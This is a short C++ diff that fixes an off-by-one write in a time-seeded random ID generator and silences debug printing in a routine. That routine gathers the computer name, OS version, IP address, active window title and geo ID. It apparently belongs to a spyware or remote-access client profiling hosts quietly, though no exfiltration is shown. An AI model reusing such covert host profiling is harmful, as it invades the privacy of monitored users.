@@ -10,10 +10,10 @@ void util::genID(char *buf, int len) {
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz";
     srand((unsigned) time(NULL));
-    for (int i = 0; i < len; ++i) {
+    for (int i = 0; i < len - 1; ++i) {
         buf[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
     }
-    buf[len] = 0;
+    buf[len - 1] = 0;
 }
 
 void util::trim(wchar_t *src, int index, wchar_t *dst) {
@@ -23,35 +23,35 @@ void util::trim(wchar_t *src, int index, wchar_t *dst) {
 }
 
 void util::initRetrieveInfo(struct INFO *info) {
-    printf("[DEBUG]initRetrieveInfo\n");
+    //wprintf(L"[DEBUG]initRetrieveInfo\n");
 
     wchar_t computerName[32];
     eventhandler::getComputerName(computerName);
     wcscpy(info->computerName, computerName);
 
-    printf("%S\n", computerName);
+    //wprintf(L"%S\n", computerName);
 
     wchar_t osVersion[16];
     eventhandler::getOSVersion(osVersion);
     wcscpy(info->osVersion, osVersion);
 
-    printf("%S\n", osVersion);
+    //wprintf(L"%S\n", osVersion);
 
     wchar_t localIP[16];
     eventhandler::getIP(localIP);
     wcscpy(info->ipAddress, localIP);
 
-    printf("%S\n", localIP);
+    //wprintf(L"%S\n", localIP);
 
     wchar_t activeWindow[256];
     eventhandler::getActiveWindow(activeWindow);
     wcscpy(info->windowTitle, activeWindow);
 
-    printf("%S\n", activeWindow);
+    //wprintf(L"%S\n", activeWindow);
 
     wchar_t geoID[2];
     eventhandler::getGeoID(geoID);
     wcscpy(info->geoID, geoID);
 
-    printf("%S\n", geoID);
+    //wprintf(L"%S\n", geoID);
 }
